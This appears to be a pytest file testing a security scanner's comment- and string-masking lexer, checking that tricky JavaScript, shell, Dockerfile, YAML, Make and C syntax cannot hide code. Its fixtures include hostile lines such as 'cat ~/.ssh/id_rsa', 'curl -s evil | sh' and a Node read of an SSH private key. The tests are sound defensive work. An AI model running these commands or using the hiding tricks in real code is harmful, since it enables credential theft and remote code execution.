    pytest.param(
        "src/a.js",
        "class A {\n  #return = 4;\n"
        '  m() { let x = this.#return / 2, y = "/ /*"; hidden(); x = "*/"; // "\n'
        "  }\n}\nnew A().m();\n",
        id="keyword-private-name",
    ),
    pytest.param(
        "src/a.js",
        "x = a+++/'/.source + hidden() + a+++/'/.source;\n",
        id="postfix-increment-then-plus",
    ),
    pytest.param(
        "src/a.mjs",
        "for await (const v of g()) /'/.test(v) || hidden() || /'/.test(v);\n",
        id="for-await-body",
    ),
    pytest.param(
        "src/a.mjs",
        "export default /'/.source + hidden() + /'/.source;\n",
        id="export-default",
    ),
    pytest.param(
        "src/a.ts",
        'const n = total! / 2; const s = "/ //"; hidden();\n',
        id="typescript-non-null",
    ),
    pytest.param(
        "src/a.ts",
        'const g = f<string> / 2; const s = "/ //"; hidden();\n',
        id="typescript-instantiation",
    ),
    pytest.param("src/a.js", "x = 1; <!-- /*\nhidden();\n// */\n", id="html-open"),
    pytest.param("src/a.js", "x = 1\n--> /*\nhidden();\n// */\n", id="html-close"),
]


@pytest.mark.parametrize(("path", "source"), _AMBIGUOUS_SLASHES)
def test_an_undecidable_javascript_slash_never_hides_code(
    path: str, source: str
) -> None:
    comment_masked = mask_comments(source, path)

    assert "hidden()" in comment_masked
    assert "hidden()" in mask_string_literals(comment_masked, path)


@pytest.mark.parametrize(
    ("path", "source"),
    [
        ("src/a.js", "function f() {\n  return /x\\/*/.test(s) // c\n}\n"),
        ("src/a.js", "x = obj.if(1) / 2; y = '/'; // c\n"),
        ("src/a.js", "x = arr\n  .with(0, 1) / 2; y = '/'; // c\n"),
        ("src/a.js", "x = a++ + b; y = /'/.test(s); // c\n"),
        ("src/a.js", "x = {a: 1}\n// c\n"),
        ("src/a.ts", "if (!/'/.test(s)) run(); // c\n"),
        ("src/a.ts", "const f = (): RegExp => /'/; // c\n"),
        ("src/a.ts", "const n = total!; const h = n / 2; // c\n"),
        # A ``/`` after a numeric literal, including a trailing-dot float
        # (``1.``), divides. Node runs each of these; treating the slash as a
        # regular expression opener folded the rest of the line away.
        ("src/a.js", "const q = 1. / 2; const a = '/'; // c\n"),
        ("src/a.ts", "const q = 10. / 2; const a = '/'; // c\n"),
        ("src/a.js", "x = a < b; y = c <d; // c\n"),
    ],
)
def test_decidable_javascript_slashes_keep_their_masking(
    path: str, source: str
) -> None:
    assert mask_comments(source, path) == _blank(source, "// c")


# Babel parses each of these as a JSX element whose text holds ``//``; the
# ``run()`` after it is code. Only an ASCII letter after ``<`` used to count as
# JSX, so these read as a comparison and the JSX text as a comment.
@pytest.mark.parametrize(
    ("opening", "closing"),
    [
        pytest.param("< div>", "</div>", id="blank-before-name"),
        pytest.param("</* c */div>", "</div>", id="comment-before-name"),
        pytest.param("<\ndiv>", "</div>", id="line-break-before-name"),
        pytest.param("<\u00e9>", "</\u00e9>", id="non-ascii-letter"),
        pytest.param("<\u216b>", "</\u216b>", id="letter-number"),
    ],
)
def test_jsx_text_cannot_hide_code_after_any_expression_start_angle(
    opening: str, closing: str
) -> None:
    source = f"const a = {opening}a // b{closing}; run();\n"

    assert "run();" in mask_comments(source, "src/app.js")


def test_float_division_cannot_hide_served_code() -> None:
    """``1. / 2`` divides; node runs ``run()``. A regex guess blanked it.

    The trailing dot is a numeric literal's decimal point, so the following
    slash cannot open a regular expression. Treating it as one consumed the
    rest of the line, including the string quotes after it, and blanked the
    served call that followed.
    """
    source = 'const half = 1. / 2; const a = "/"; const b = "//"; run(half, a, b);\n'

    assert "run(half, a, b)" in mask_comments(source, "src/server.js")


def test_object_literal_division_cannot_hide_a_served_credential_read() -> None:
    source = (
        'const fs = require("fs");\n'
        'const cfg = {a: 1} / 2; const sep = "/ /*";\n'
        'const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa");\n'
        'const note = "*/"; // "\n'
    )

    findings = _decisive("src/server.js", source)

    assert "credential_access" in {finding["category"] for finding in findings}
    assert citation_admissibility("src/server.js", source, 3).admissible


@pytest.mark.parametrize(
    "source",
    [
        'echo "$(printf " #")" ; cat ~/.ssh/id_rsa\n',
        "echo\\ #; cat ~/.ssh/id_rsa\n",
        "echo a\\\n#b; cat ~/.ssh/id_rsa\n",
        'x=$(case $y in a) echo " #";; esac); cat ~/.ssh/id_rsa\n',
        "echo ${x#*/} ${#y} $# 16#ff; cat ~/.ssh/id_rsa\n",
    ],
)
def test_shell_quoting_and_escapes_cannot_hide_code(source: str) -> None:
    assert mask_comments(source, "scripts/run.sh") == source


# bash runs every one of these and calls hidden: the ``<<`` is a shift, not a
# here-document, so the quote on the next line opens a string and the ``#``
# line is inside it. Reading a here-document skips that quote and turns the
# executed line into a comment.
@pytest.mark.parametrize(
    ("head", "delimiter"),
    [
        pytest.param("x=$(( 1 << 2 ))", "2", id="arithmetic-expansion"),
        pytest.param('echo "$((1<<2))"', "2", id="arithmetic-in-quotes"),
        pytest.param("(( a = 1 << 2 ))", "2", id="arithmetic-command"),
        pytest.param("for ((i = 0; i < (1 << 2); i++)); do :; done", "2", id="for"),
        pytest.param("x=$[1<<2]", "2]", id="legacy-arithmetic"),
        pytest.param("a[1<<2]=3", "2]=3", id="array-subscript"),
    ],
)
def test_shell_shift_is_not_a_here_document(head: str, delimiter: str) -> None:
    source = f'{head}\ny="\n{delimiter}\n# " ; hidden\nz="\n"\n'

    assert "; hidden" in mask_comments(source, "scripts/run.sh")


# bash keeps a backslash that sits inside quotes when it removes quoting from a
# here-document delimiter, so ``<<'a\b'`` ends at ``a\b``, not ``ab``. Stripping
# every backslash shortened the delimiter; a body line equal to the shortened
# form then ended the body early and the script bash still feeds the here-
# document (verbatim) was blanked as a comment.
@pytest.mark.parametrize(
    ("opener", "short"),
    [
        pytest.param(r"<<'a\b'", "ab", id="single-quoted-backslash"),
        pytest.param(r'<<"a\b"', "ab", id="double-quoted-backslash"),
        pytest.param(r'<<"a\\b"', "ab", id="double-quoted-escaped-backslash"),
    ],
)
def test_shell_here_document_delimiter_keeps_quoted_backslash(
    opener: str, short: str
) -> None:
    delimiter = opener.removeprefix("<<").strip("'\"").replace("\\\\", "\\")
    source = f"sh {opener}\n{short}\n: # $(cat /root/.ssh/id_rsa)\n{delimiter}\n"

    assert "# $(cat /root/.ssh/id_rsa)" in mask_comments(source, "scripts/run.sh")


def test_a_case_argument_cannot_hold_a_command_substitution_open() -> None:
    """``echo case`` is an argument; bash closes ``$(`` at the first ``)``.

    bash runs line 1 before it would parse anything after ``exit``, so text
    there can rebalance a lexer's quotes and parentheses without running.
    """
    source = (
        'x="$(echo case)# "; hidden\nexit 0\ncase esac in esac) true;; esac\ntrue # "\n'
    )

    assert "; hidden" in mask_comments(source, "scripts/run.sh")


@pytest.mark.parametrize(
    ("source", "comments"),
    [
        ("cat <<EOF\n# body\nEOF\necho hi # c\n", ("# c",)),
        ("cat<<EOF >out\n# body\nEOF\n# c\n", ("# c",)),
        ("echo $(( 16#ff )) $(( (1 + 2) * 3 )) # c\n", ("# c",)),
        ("(( x = 1 << 2 )) # c\n", ("# c",)),
        ("x=$(cat <<EOF\n# body\nEOF\n) # c\n", ("# c",)),
        ('case $1 in\n  a) echo "#" ;; # c\nesac\n', ("# c",)),
    ],
)
def test_shell_here_documents_and_arithmetic_keep_their_masking(
    source: str, comments: tuple[str, ...]
) -> None:
    assert mask_comments(source, "scripts/run.sh") == _blank(source, *comments)


@pytest.mark.parametrize(
    ("path", "source"),
    [
        pytest.param("src/main.rs", "/* never closed\nrun();\n", id="rust-comment"),
        pytest.param("src/main.rs", 'let s = "never closed;\nrun();\n', id="rust-str"),
        pytest.param("cmd/main.go", "x := `never closed\nrun() // c\n", id="go-raw"),
        pytest.param("src/app.js", "const a = 'x;\nrun(); // c\n", id="js-string-eol"),
        pytest.param(
            "src/app.js",
            "const el = <p>It's</p>; const u = '/*';\nrun();\n/* */\n",
            id="jsx-in-js",
        ),
        pytest.param("src/app.js", "run(); }\n// c\n", id="js-unbalanced"),
        pytest.param("src/app.js", "x = {a: 1} / 2; // c\n", id="js-regex-eol"),
        pytest.param("src/agent.py", '"""never closed\n# c\nrun()\n', id="python"),
        pytest.param("scripts/run.sh", "echo 'never closed\n# c\n", id="shell"),
        pytest.param("config.yaml", 'a: "never closed\n# c\n', id="yaml"),
    ],
)
def test_sources_that_do_not_lex_are_left_unmasked(path: str, source: str) -> None:
    assert mask_comments(source, path) == source
    assert mask_string_literals(source, path) == source


def test_python_that_does_not_tokenize_still_masks_hash_comments() -> None:
    """Python 2 or mixed indentation falls back to a quote-aware ``#`` lexer."""
    source = "def f():\n\tx = 'a # b'  # c\n        return x // 2\n"

    assert mask_comments(source, "src/legacy.py") == _blank(source, "# c")


@pytest.mark.parametrize(
    ("path", "language"),
    [
        ("src/agent.py", "python"),
        ("stubs/x.pyi", "python"),
        ("src/main.rs", "rust"),
        ("web/server.mjs", "javascript"),
        ("web/app.tsx", "typescript"),
        ("web/app.jsx", "javascript"),
        ("src/App.java", "java"),
        ("src/Main.kt", "kotlin"),
        ("build.gradle.kts", "kotlin"),
        ("src/Program.cs", "csharp"),
        ("lib/main.dart", "dart"),
        ("public/index.php", "php"),
        ("src/main.zig", "zig"),
        ("Sources/main.swift", "swift"),
        ("src/Main.scala", "scala"),
        ("src/app.groovy", "groovy"),
        ("build.gradle", "groovy"),
        ("src/App.fs", "fsharp"),
        ("src/Bridge.mm", "c"),
        ("src/Bridge.m", None),
        ("docker/Dockerfile.dev", "dockerfile"),
        ("build/app.dockerfile", "dockerfile"),
        ("Containerfile", "dockerfile"),
        ("GNUmakefile", "make"),
        ("rules.mk", "make"),
        ("requirements-dev.txt", "requirements"),
        ("notes.txt", None),
        (".env.local", "dotenv"),
        ("Pipfile", "toml"),
        ("package.json", None),
        ("lib/tool.rb", None),
        ("LICENSE", None),
    ],
)
def test_language_table_is_explicit(path: str, language: str | None) -> None:
    assert language_for_path(path) == language


@pytest.mark.parametrize(
    ("path", "comment"),
    [
        ("src/agent.py", "# prose"),
        ("scripts/run.sh", "# prose"),
        ("src/cli.js", "// prose"),
    ],
)
def test_interpreter_line_stays_visible(path: str, comment: str) -> None:
    """The kernel runs a ``#!`` line; ``env -S`` makes it a whole command."""
    source = f"#!/usr/bin/env -S sh -c 'cat ~/.ssh/id_rsa'\n{comment}\n"

    assert mask_comments(source, path) == _blank(source, comment)


def test_dockerfile_rules_that_change_the_shell_leave_run_text_visible() -> None:
    source = 'SHELL ["cmd", "/S", "/C"]\nRUN echo a # b\n# c\n'

    assert mask_comments(source, "Dockerfile") == _blank(source, "# c")


def test_dockerfile_directive_only_counts_at_the_top() -> None:
    source = "# syntax=example/frontend\nFROM alpine\n# syntax=later\n"

    assert mask_comments(source, "Dockerfile") == _blank(source, "# syntax=later")


def test_dockerfile_exec_form_is_not_shell_lexed() -> None:
    source = 'CMD ["sh", "-c", "run # not a Dockerfile comment"]\n'

    assert mask_comments(source, "Dockerfile") == source


# BuildKit runs every one of these here-documents, including the ``#`` line,
# which sits inside the script's double-quoted string: the delimiter is the
# rest of the shell word after ``<<`` with its quotes removed. A shorter or
# missing delimiter ended the lexer's skip early and blanked that line as a
# Dockerfile comment.
@pytest.mark.parametrize(
    ("opener", "delimiter"),
    [
        pytest.param('<<"E F"', "E F", id="quoted-blank"),
        pytest.param("<<-'E F'", "E F", id="strip-tabs-quoted-blank"),
        pytest.param("<<.EOF", ".EOF", id="leading-dot"),
        pytest.param('<<"$X"', "$X", id="dollar"),
        pytest.param('<<"EOF"x', "EOFx", id="quote-then-text"),
        pytest.param("<<EOF;true", "EOF;true", id="semicolon"),
        pytest.param("<<  END", "END", id="blanks-then-name"),
        pytest.param("<<\tEND", "END", id="tab-then-name"),
        pytest.param('cat << "E F"', "E F", id="blank-then-quoted-blank"),
        pytest.param("cat << EOF;true", "EOF;true", id="blank-then-semicolon"),
    ],
)
def test_dockerfile_here_document_ends_at_buildkits_delimiter(
    opener: str, delimiter: str
) -> None:
    source = (
        f"FROM alpine\nRUN {opener}\nEOF\n"
        'echo "\n# $(cat /root/.ssh/id_rsa)\n"\n'
        f"{delimiter}\n"
    )

    assert "# $(cat /root/.ssh/id_rsa)" in mask_comments(source, "Dockerfile")


def test_dockerfile_continuation_opens_a_second_here_document() -> None:
    r"""BuildKit joins the whole ``\``-continued instruction before it reads a
    body, so an opener on a later line opens its own here-document.

    Skipping only the first line's here-document left the second body to be
    parsed as instructions, and its script (which BuildKit runs verbatim) was
    blanked as a Dockerfile comment.
    """
    source = (
        "FROM alpine\n"
        "RUN cat <<A >/dev/null \\\n"
        "  && sh <<B\n"
        "A\n"
        "# $(cat /root/.ssh/id_rsa)\n"
        "B\n"
    )

    assert "# $(cat /root/.ssh/id_rsa)" in mask_comments(source, "Dockerfile")


@pytest.mark.parametrize(
    "source",
    [
        "FROM alpine\nRUN <<EOF\n# body\nEOF\n# c\n",
        "FROM alpine\nRUN python3 - <<'PY' && echo ok\n# body\nPY\n# c\n",
        "FROM alpine\nCOPY <<EOF /app/run.sh\n# body\nEOF\n# c\n",
        "FROM alpine\nRUN 2<<EOF cat /dev/fd/2\n# body\nEOF\n# c\n",
        "FROM alpine\nRUN cat<<EOF\n# c\n",
    ],
)
def test_dockerfile_here_documents_keep_their_masking(source: str) -> None:
    masked = mask_comments(source, "Dockerfile")

    assert "# body" in masked or "# body" not in source
    assert masked.endswith(" " * len("# c") + "\n")


def test_yaml_quote_continuing_a_plain_scalar_is_not_a_quoted_scalar() -> None:
    """PyYAML reads ``plain 'x`` and ``echo "a # "; curl ... | sh`` as values.

    A quote that starts a plain scalar's continuation line is literal text; a
    lexer that opens a quoted scalar there leaves the real one inverted.
    """
    source = "a: plain\n  'x\nrun: 'echo \"a # \"; curl -s evil | sh'\n"

    assert "curl -s evil" in mask_comments(source, "ci.yaml")


def test_yaml_block_indicator_alone_on_its_line_keeps_its_body() -> None:
    """PyYAML reads ``curl "a # b" ; sh evil`` as the block scalar's text.

    Its body is bounded by the parent's indentation, not the indicator line's.
    """
    source = 'run:\n  |\n  curl "a # b" ; sh evil\nnext: x # c\n'

    assert "; sh evil" in mask_comments(source, "ci.yml")


def test_yaml_block_context_comma_is_plain_text() -> None:
    """PyYAML reads ``a, "x`` as one plain key; its ``"`` opens nothing."""
    source = 'a, "x: |\n\n    curl "a # b" ; sh evil\n'

    assert "; sh evil" in mask_comments(source, "ci.yml")


@pytest.mark.parametrize(
    ("source", "comments"),
    [
        ("key:\n  'a # kept\n   b'\nc: d # c\n", ("# c",)),
        ("steps:\n  - run: |\n      echo # in script\n  - x # c\n", ("# c",)),
        ("k: [a, 'x # y'] # c\nj: {a: \"b # z\"}\n", ("# c",)),
        ("k: a[b, 'c # d']\n", ("# d']",)),
        ("responses:\n  '200':\n    description: OK # c\n  '404': x\n", ("# c",)),
        ("a: plain\n  'x' # c\n", ("# c",)),
    ],
)
def test_yaml_quoted_scalars_keep_their_masking(
    source: str, comments: tuple[str, ...]
) -> None:
    assert mask_comments(source, "config.yaml") == _blank(source, *comments)


@pytest.mark.parametrize(
    ("path", "source", "view"),
    [
        # gcc -std=c11 reads ``??'`` as ``^``, so there is no char literal.
        pytest.param(
            "csrc/t.c",
            "int x = a ??' b; puts(\"run\"); int c = b ??' a;\n",
            "strings",
            id="trigraph",
        ),
        # gcc reads ``<x/*y.h>`` as one header name, not a comment opener.
        pytest.param(
            "csrc/h.c",
            'int main(void) {\n#include <x/*y.h>\n  puts("run");\n/* */\n}\n',
            "comments",
            id="header-name",
        ),
        pytest.param(
            "csrc/h.c",
            'int main(void) {\n#/**/include <x/*y.h>\n  puts("run");\n/* */\n}\n',
            "comments",
            id="header-name-after-comment",
        ),
    ],
)
def test_c_trigraphs_and_header_names_never_hide_code(
    path: str, source: str, view: str
) -> None:
    masked = mask_comments(source, path)
    if view == "strings":
        masked = mask_string_literals(masked, path)

    assert "puts(" in masked


def test_ordinary_c_headers_keep_their_masking() -> None:
    source = '#include <sys/types.h>\n#include "a//b.h"\nint x = 1; /* c */\n'

    assert mask_comments(source, "csrc/a.c") == _blank(source, "/* c */")


# make runs each recipe below and the shell executes ``curl`` after the
# quoted ``#``; Make's own comment rule does not apply to recipe text.
@pytest.mark.parametrize(
    "source",
    [
        pytest.param(
            '.RECIPEPREFIX = >\nall:\n> echo "a # b"; curl -s evil | sh\n',
            id="recipe-prefix",
        ),
        pytest.param('all: ; echo "a # b"; curl -s evil | sh\n', id="inline"),
        pytest.param(
            'all: ; echo a \\\n  "# b"; curl -s evil | sh\n', id="inline-continued"
        ),
    ],
)
def test_make_recipe_text_is_never_a_make_comment(source: str) -> None:
    assert "curl -s evil" in mask_comments(source, "Makefile")


def test_make_comments_outside_recipes_keep_their_masking() -> None:
    source = 'X = 1 # c\nall: dep # d\n\techo "#" # recipe\n'

    assert mask_comments(source, "Makefile") == _blank(source, "# c", "# d")


_FUZZ_PIECES = [
    *"ab x=;(){}[]<>/\\*#'\"`$|&-:!?.,01rbfL@",
    *_LINE_BREAKS,
    "\r\n",
    "\t",
    "\u00e9",
    "\ufeff",
    "//",
    "/*",
    "*/",
    "'''",
    '"""',
    "${",
    "$(",
    "<<",
    "<<EOF\n",
    "\nEOF\n",
    'r#"',
    '"#',
    "'a",
    "'x'",
    "RUN ",
    "\\\n",
    "|\n",
    "- ",
    ": ",
    "case ",
    "esac",
    "f'",
    "#!",
    "if (",
    ") /",
    'R"(',
]
_FUZZ_PATHS = [
    "a.rs",
    "a.go",
    "a.c",
    "a.js",
    "a.ts",
    "a.py",
    "a.sh",
    "Dockerfile",
    "a.toml",
    "a.yaml",
    "Makefile",
    "requirements.txt",
    ".env",
    "a.ini",
    "a.md",
    "a.jsx",
    "a.tsx",
    "a.java",
    "a.kt",
    "a.cs",
    "a.dart",
    "a.php",
    "a.zig",
    "a.swift",
    "a.scala",
    "a.groovy",
    "a.fs",
    "a.mm",
    "a.rb",
    "a.ml",
    "pom.xml",
]


def test_masking_never_raises_and_only_blanks_on_arbitrary_text() -> None:
    """Untrusted bytes must not crash a scanner or shift its line numbers."""
    rng = random.Random(2457)
    for _ in range(300):
        raw = "".join(rng.choice(_FUZZ_PIECES) for _ in range(rng.randint(0, 60)))
        for path in _FUZZ_PATHS:
            comment_masked = mask_comments(raw, path)
            for masked in (
                comment_masked,
                mask_string_literals(comment_masked, path),
                mask_lead_comments(raw, path),
            ):
                assert len(masked) == len(raw)
                assert len(masked.splitlines()) == len(raw.splitlines())
                assert all(a == b or b == " " for a, b in zip(raw, masked, strict=True))


@pytest.mark.parametrize(
    ("path", "source"),
    [
        pytest.param("src/app.js", "x = /[ " * 15_000, id="js-unclosed-regex-classes"),
        pytest.param("src/app.js", "a" * 100_000 + " b (1)", id="js-long-identifier"),
        pytest.param("csrc/a.c", "1" + "'1" * 50_000, id="c-digit-separators"),
        pytest.param("csrc/a.c", "a'b'" * 25_000, id="c-char-literal-chain"),
        pytest.param("scripts/run.sh", "\\" * 100_000 + " #x", id="shell-backslashes"),
        pytest.param("src/P.cs", " #" * 100_000, id="csharp-directive-marks"),
        pytest.param("src/A.java", "\\" * 200_000, id="java-backslashes"),
        pytest.param("src/A.kt", '"${' * 50_000, id="kotlin-open-fields"),
        pytest.param("lib/a.dart", "'${" * 50_000, id="dart-open-fields"),
        pytest.param("src/a.php", "<?php " + '"$a' * 60_000, id="php-fields"),
        pytest.param("src/main.zig", "'\\" * 100_000, id="zig-escapes"),
        pytest.param("src/a.m", "/*\n" * 50_000, id="unlexed-block-openers"),
        pytest.param("src/a.swift", '"\\(' * 50_000, id="swift-open-interpolations"),
        pytest.param("src/a.swift", "(/x" * 60_000, id="swift-slashes"),
        pytest.param("src/a.swift", "#" * 100_000 + '"', id="swift-pounds"),
        pytest.param("src/a.scala", 's"${' * 50_000, id="scala-open-fields"),
        pytest.param("src/a.groovy", '"${' * 50_000, id="groovy-open-fields"),
        pytest.param("src/a.fs", "(*" * 100_000, id="fsharp-nested-comments"),
    ],
)
def test_crafted_sources_lex_in_linear_time(path: str, source: str) -> None:
    """A quadratic lexer would let one submission stall a screener for minutes."""
    started = time.perf_counter()
    mask_string_literals(mask_comments(source, path), path)
    assert time.perf_counter() - started < 5
